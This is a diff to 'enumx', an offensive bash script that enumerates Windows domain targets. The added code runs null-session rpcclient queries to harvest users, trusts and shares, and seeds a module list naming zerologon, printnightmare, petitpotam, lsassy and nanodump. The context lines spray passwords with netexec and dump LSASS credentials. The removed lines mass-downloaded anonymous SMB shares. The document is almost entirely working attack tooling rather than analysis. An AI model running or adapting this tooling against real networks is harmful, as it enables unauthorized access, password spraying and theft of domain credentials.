@@ -21,7 +21,6 @@ EOF
 if [ -z "$1" ]; then
     echo "  Examples:"
     echo "    enumx <TARGET>                - Run enumeration on the specified target."
-    echo "    enumx <TARGET> creds          - Run enumeration on the specified target using specific usernames and passwords."
     echo "    enumx <TARGET> web            - Run web enumeration on the specified target."
     echo "    enumx <TARGET> crack          - Attempt to quickly crack each hash within 15 seconds."
     echo "    enumx update                  - Update to the latest version of enumx."
@@ -72,8 +71,25 @@ sort -u "$enumx_dir"/creds -o "$enumx_dir"/creds 2>/dev/null
 touch "$enumx_dir"/domains
 sort -u "$enumx_dir"/domains -o "$enumx_dir"/domains 2>/dev/null
 
+if [ ! -s "$enumx_dir/modules" ]; then
+    echo "enum_av
+enum_ca
+enum_dns
+petitpotam
+zerologon
+spooler
+printnightmare
+dfscoerce
+shadowcoerce
+lsassy
+nanodump
+procdump
+uac
+webdav" >> "$enumx_dir/modules"
+fi
+
 # Enter usernames and passwords if creds parameter is selected
-if [[ "$2" == "creds" ]]; then
+if [[ "$1$2" == "$target" ]]; then
   nano "$enumx_dir"/usernames
   nano "$enumx_dir"/passwords
   nano "$enumx_dir"/creds
@@ -218,6 +234,11 @@ for port in $open_ports; do
             echo "Enumerating port $port can take some time please wait..."
             mkdir -p "$enumx_dir"/smb 2>/dev/null
           	if [ "$using_creds" == true ]; then
+          		rpcclient -U "" -N "$target" -c "enumdomusers" 2>/dev/null | sed 's/.*:\[\([^]]*\)\] .*/\1/' | grep -viE '\$|error|sm_|mailbox' | tee -a "$enumx_dir/usernames"
+ 	            sort -u "$enumx_dir"/usernames -o "$enumx_dir"/usernames 2>/dev/null
+ 	            rpcclient -U "" -N "$target" -c "dsenumdomtrusts" 2>/dev/null | awk '{print $1}' | sed '1d' | tee -a "$enumx_dir/domains"
+ 	            sort -u "$enumx_dir"/domains -o "$enumx_dir"/domains 2>/dev/null
+          		rpcclient -U "" -N "$target" -c "dfsenum;netshareenum;netshareenumall;netfileenum;enumdomgroups;enumprocs;winreg_enumkey;" 2>/dev/null | sed 's/.*:\[\([^]]*\)\] .*/\1/' | grep -viE '\$|error|sm_|mailbox'
           		spray=$(netexec smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success | grep -viE '\\:')
           		echo "$spray" | grep -iE '[+]' | awk '{print $6}' | cut -d'\' -f2- | tee -a "$enumx_dir/creds"
   		        sort -u "$enumx_dir"/creds -o "$enumx_dir"/creds 2>/dev/null
@@ -232,7 +253,7 @@ for port in $open_ports; do
  	            	sort -u "$enumx_dir"/shares -o "$enumx_dir"/shares 2>/dev/null
  	                echo "$groups" | grep -viE '[*]|[-]' | sed -E '1d'
  	                echo "$ridbrute" | grep -viE '[*]|[-]' | grep -E '[+]|SidTypeUser' | sed -E '1d'
- 	                echo "$ridbrute" | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | tee -a "$enumx_dir/usernames"
+ 	                echo "$ridbrute" | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | grep -viE '\$|error|sm_|mailbox' | tee -a "$enumx_dir/usernames"
  	                sort -u "$enumx_dir"/usernames -o "$enumx_dir"/usernames 2>/dev/null
  	                if [ -n "$credp" ]; then
 	                    echo "Using netexec modules as $credu:$credp on $target..."
@@ -248,22 +269,7 @@ for port in $open_ports; do
  	                
  	                result=$(netexec smb "$target" -u "$credu" -p "$credp" -M lsassy | grep -viE '[+]|[*]')
    		        done < "$enumx_dir/creds"
-            else
-                default_usernames=("guest" "")
-                for user in "${default_usernames[@]}"
-                do
-                shares=$(netexec smb "$target" --port "$port" -u "$user" -p '' --shares)
-                groups=$(netexec smb "$target" --port "$port" -u "$user" -p '' --groups)
-                ridbrute=$(netexec smb "$target" --port "$port" -u "$user" -p '' --rid-brute)
-                list_shares=($(echo "$shares" | grep -iE 'READ|Write' | awk '{print $5}'))
-                echo "$shares" | awk '{printf "%-15s %-15s %-15s %-20s\n",$4,$5,$6,$7" "$8" "$9" "$10}' | grep -vE '[*]'
-                echo "$groups" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]'
-                echo "$ridbrute" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]' | grep -E '[+]|SidTypeUser'
-                done
-                for share in "${list_shares[@]}"; do
-                    smbclient "//$target/$share" -U '' --no-pass -c "lcd $enumx_dir/smb; recurse ON; prompt OFF; mget *" >/dev/null 2>&1
-	        done
-	    fi
+	    	fi
             tree "$enumx_dir"/smb 2>/dev/null
             find "$enumx_dir"/smb -type f 2>/dev/null
             echo
@@ -309,6 +315,11 @@ for port in $open_ports; do
             echo "Enumerating port $port can take some time please wait..."
             mkdir -p "$enumx_dir"/smb 2>/dev/null
           	if [ "$using_creds" == true ]; then
+          		rpcclient -U "" -N "$target" -c "enumdomusers" 2>/dev/null | sed 's/.*:\[\([^]]*\)\] .*/\1/' | grep -viE '\$|error|sm_|mailbox' | tee -a "$enumx_dir/usernames"
+ 	            sort -u "$enumx_dir"/usernames -o "$enumx_dir"/usernames 2>/dev/null
+ 	            rpcclient -U "" -N "$target" -c "dsenumdomtrusts" 2>/dev/null | awk '{print $1}' | sed '1d' | tee -a "$enumx_dir/domains"
+ 	            sort -u "$enumx_dir"/domains -o "$enumx_dir"/domains 2>/dev/null
+          		rpcclient -U "" -N "$target" -c "dfsenum;netshareenum;netshareenumall;netfileenum;enumdomgroups;enumprocs;winreg_enumkey;" 2>/dev/null | sed 's/.*:\[\([^]]*\)\] .*/\1/' | grep -viE '\$|error|sm_|mailbox'
           		spray=$(netexec smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success | grep -viE '\\:')
           		echo "$spray" | grep -iE '[+]' | awk '{print $6}' | cut -d'\' -f2- | tee -a "$enumx_dir/creds"
   		        sort -u "$enumx_dir"/creds -o "$enumx_dir"/creds 2>/dev/null
@@ -323,7 +334,7 @@ for port in $open_ports; do
  	            	sort -u "$enumx_dir"/shares -o "$enumx_dir"/shares 2>/dev/null
  	                echo "$groups" | grep -viE '[*]|[-]' | sed -E '1d'
  	                echo "$ridbrute" | grep -viE '[*]|[-]' | grep -E '[+]|SidTypeUser' | sed -E '1d'
- 	                echo "$ridbrute" | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | tee -a "$enumx_dir/usernames"
+ 	                echo "$ridbrute" | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | grep -viE '\$|error|sm_|mailbox' | tee -a "$enumx_dir/usernames"
  	                sort -u "$enumx_dir"/usernames -o "$enumx_dir"/usernames 2>/dev/null
  	                if [ -n "$credp" ]; then
 	                    echo "Using netexec modules as $credu:$credp on $target..."
@@ -339,22 +350,7 @@ for port in $open_ports; do
  	                
  	                result=$(netexec smb "$target" -u "$credu" -p "$credp" -M lsassy | grep -viE '[+]|[*]')
    		        done < "$enumx_dir/creds"
-            else
-                default_usernames=("guest" "")
-                for user in "${default_usernames[@]}"
-                do
-                shares=$(netexec smb "$target" --port "$port" -u "$user" -p '' --shares)
-                groups=$(netexec smb "$target" --port "$port" -u "$user" -p '' --groups)
-                ridbrute=$(netexec smb "$target" --port "$port" -u "$user" -p '' --rid-brute)
-                list_shares=($(echo "$shares" | grep -iE 'READ|Write' | awk '{print $5}'))
-                echo "$shares" | awk '{printf "%-15s %-15s %-15s %-20s\n",$4,$5,$6,$7" "$8" "$9" "$10}' | grep -vE '[*]'
-                echo "$groups" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]'
-                echo "$ridbrute" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]' | grep -E '[+]|SidTypeUser'
-                done
-                for share in "${list_shares[@]}"; do
-                    smbclient "//$target/$share" -U '' --no-pass -c "lcd $enumx_dir/smb; recurse ON; prompt OFF; mget *" >/dev/null 2>&1
-	        done
-	    fi
+	    	fi
             tree "$enumx_dir"/smb 2>/dev/null
             find "$enumx_dir"/smb -type f 2>/dev/null
             echo
